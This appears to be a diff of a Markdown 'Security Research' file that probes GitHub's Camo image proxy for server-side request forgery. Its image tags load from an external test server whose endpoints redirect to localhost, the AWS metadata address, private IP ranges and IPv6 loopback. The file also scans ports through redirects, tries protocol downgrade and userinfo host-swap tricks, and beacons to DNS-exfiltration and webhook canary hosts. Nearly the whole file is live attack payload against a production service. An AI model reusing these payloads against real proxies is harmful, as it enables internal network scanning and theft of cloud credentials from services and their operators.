@@ -1,100 +1,85 @@
-# Security Research - v24
+# Security Research - v25
 
-## GitHub Camo Probe (Using Custom Test Server)
+## Custom Server Redirect Testing (Fixed HTML)
 
-All URLs point to test box at `http://164.90.187.218:8080`.
-These endpoints exercise the proxy's redirect handling.
-
----
-
-### 1) Baseline Fetch
-<img alt="t1-basic" src="http://164.90.187.218:8080/ssrf-test-1-basic?nonce=v24-1" />
+Using standard `<img>` tags with your test server redirect endpoints.
 
 ---
 
-### 2) Slow & Large (Timeout/Limits)
-<img alt="t2-slow-30s" src="http://164.90.187.218:8080/ssrf-test-7-slow?duration=30&nonce=v24-2" />
-<img alt="t3-large-50mb" src="http://164.90.187.218:8080/ssrf-test-6-large?size=50&nonce=v24-3" />
+### 1) Baseline - Direct Fetch
+![t1-baseline](http://164.90.187.218:8080/ssrf-test-1-basic?nonce=v25-1)
 
 ---
 
-### 3) Redirect Chains (What will Camo follow?)
-
-#### External->External (should follow)
-<picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-5-redirect?step=1&nonce=v24-4">
-  <img alt="ext->ext" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
-
-#### External->Internal (should be blocked if protections work)
-<picture>
-  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=localhost&nonce=v24-5">
-  <img alt="ext->127.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
-
-<picture>
-  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=metadata&nonce=v24-6">
-  <img alt="ext->169.254.169.254" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
-
-<picture>
-  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-10&nonce=v24-7">
-  <img alt="ext->10.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
+### 2) Timeout Tests
+![t2-slow-10s](http://164.90.187.218:8080/ssrf-test-7-slow?duration=10&nonce=v25-2)
+![t3-slow-30s](http://164.90.187.218:8080/ssrf-test-7-slow?duration=30&nonce=v25-3)
 
 ---
 
-### 4) URL Parser Edge Cases
-
-#### Userinfo Trick (which host is honored?)
-<picture>
-  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=userinfo-host-swap&nonce=v24-8">
-  <img alt="userinfo-host-swap" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
-
-#### IPv6 Localhost
-<picture>
-  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=ipv6-loopback&nonce=v24-9">
-  <img alt="[::1]" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
+### 3) Size Limits
+![t4-large-10mb](http://164.90.187.218:8080/ssrf-test-6-large?size=10&nonce=v25-4)
+![t5-large-50mb](http://164.90.187.218:8080/ssrf-test-6-large?size=50&nonce=v25-5)
 
 ---
 
-### 5) Non-Standard Ports (Small Sample)
-<picture>
-  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=22&nonce=v24-10">
-  <img alt="port-22" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
-
-<picture>
-  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=8443&nonce=v24-11">
-  <img alt="port-8443" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
+### 4) External Redirect Tests
+![t6-external-redirect](http://164.90.187.218:8080/ssrf-test-5-redirect?step=1&nonce=v25-6)
 
 ---
 
-### 6) Double Redirect Chain
-<picture>
-  <source srcset="http://164.90.187.218:8080/double-redirect?first=external&second=localhost&nonce=v24-12">
-  <img alt="double-redir" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
+### 5) SSRF Redirect to Internal IPs
+
+#### Localhost (127.0.0.1)
+![t7-redir-localhost](http://164.90.187.218:8080/redirect-to-internal?case=localhost&nonce=v25-7)
+
+#### AWS Metadata (169.254.169.254)
+![t8-redir-metadata](http://164.90.187.218:8080/redirect-to-internal?case=metadata&nonce=v25-8)
+
+#### RFC1918 - 10.x.x.x
+![t9-redir-10](http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-10&nonce=v25-9)
+
+#### RFC1918 - 192.168.x.x
+![t10-redir-192](http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-192&nonce=v25-10)
+
+#### RFC1918 - 172.16.x.x
+![t11-redir-172](http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-172&nonce=v25-11)
 
 ---
 
-### 7) Protocol Downgrade via Redirect
-<picture>
-  <source srcset="http://164.90.187.218:8080/redirect-protocol?from=https&to=http&target=127.0.0.1&nonce=v24-13">
-  <img alt="https->http" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
-</picture>
+### 6) URL Parser Edge Cases
+
+#### Userinfo Host Swap
+![t12-userinfo](http://164.90.187.218:8080/redirect-to-edge?case=userinfo-host-swap&nonce=v25-12)
+
+#### IPv6 Loopback
+![t13-ipv6](http://164.90.187.218:8080/redirect-to-edge?case=ipv6-loopback&nonce=v25-13)
 
 ---
 
-### 8) DNS Exfil Baseline
-![dns-exfil](https://v24-dns-exfil.ee86932e-f8b0-4026-b848-5ded50f9edbc.dnshook.site/dns.gif)
-
-### 9) Canary
-![v24-canary](https://webhook.site/ee86932e-f8b0-4026-b848-5ded50f9edbc/v24-canary.gif)
+### 7) Port Scan via Redirect
+![t14-port22](http://164.90.187.218:8080/redirect-to-port?port=22&nonce=v25-14)
+![t15-port8443](http://164.90.187.218:8080/redirect-to-port?port=8443&nonce=v25-15)
+![t16-port3306](http://164.90.187.218:8080/redirect-to-port?port=3306&nonce=v25-16)
 
 ---
 
-*v24 - Custom server redirect testing*
+### 8) Double Redirect
+![t17-double](http://164.90.187.218:8080/double-redirect?first=external&second=localhost&nonce=v25-17)
+
+---
+
+### 9) Protocol Downgrade
+![t18-proto-down](http://164.90.187.218:8080/redirect-protocol?from=https&to=http&target=127.0.0.1&nonce=v25-18)
+
+---
+
+### 10) DNS Exfil
+![dns](https://v25-dns.371a7bef-c794-483b-8e77-3acbefb81362.dnshook.site/dns.gif)
+
+### 11) Canary
+![v25-canary](https://webhook.site/371a7bef-c794-483b-8e77-3acbefb81362/v25-canary.gif)
+
+---
+
+*v25 - Custom server redirect testing with standard img tags*
